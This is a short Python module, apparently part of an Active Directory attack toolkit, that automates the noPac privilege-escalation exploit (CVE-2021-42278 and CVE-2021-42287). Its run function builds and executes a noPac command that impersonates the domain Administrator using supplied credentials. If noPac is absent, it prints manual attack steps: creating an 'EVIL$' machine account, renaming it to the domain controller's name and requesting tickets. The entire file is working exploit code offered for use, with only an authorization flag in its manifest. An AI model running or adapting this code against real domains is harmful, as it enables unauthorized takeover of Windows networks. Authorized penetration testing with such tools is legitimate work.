"""sAMAccountName impersonation (noPac wrapper with auto machine account)."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.privesc.samaccountname.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["machine_account_creation", "privilege_escalation"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", None) or getattr(args, "target", None)
    dc_name = getattr(args, "dc_name", None)

    print("[*] sAMAccountName Impersonation (CVE-2021-42278 + CVE-2021-42287)")
    print("[*] Domain: {}  DC: {}".format(cred.domain, dc_ip or "auto"))

    import subprocess
    import shutil
    nopac = shutil.which("noPac.py") or shutil.which("noPac")
    if nopac:
        cmd = [nopac, "scan" if not dc_name else "exploit",
               "-dc-ip", dc_ip or "",
               "-u", "{}\\{}".format(cred.domain, cred.username or "")]
        if cred.password:
            cmd += ["-p", cred.password]
        if dc_name:
            cmd += ["--dc-host", dc_name, "--impersonate", "Administrator"]
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        return result.returncode

    print("[!] noPac not found")
    print("[*] Manual steps:")
    print("  1. addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss' {}/{}:{}".format(
        cred.domain, cred.username or "", cred.password or ""))
    print("  2. Rename machine account sAMAccountName to DC name (without $)")
    print("  3. Request TGT as renamed machine -> getTGT.py")
    print("  4. Rename back, request S4U2Self -> getST.py")
    return 1
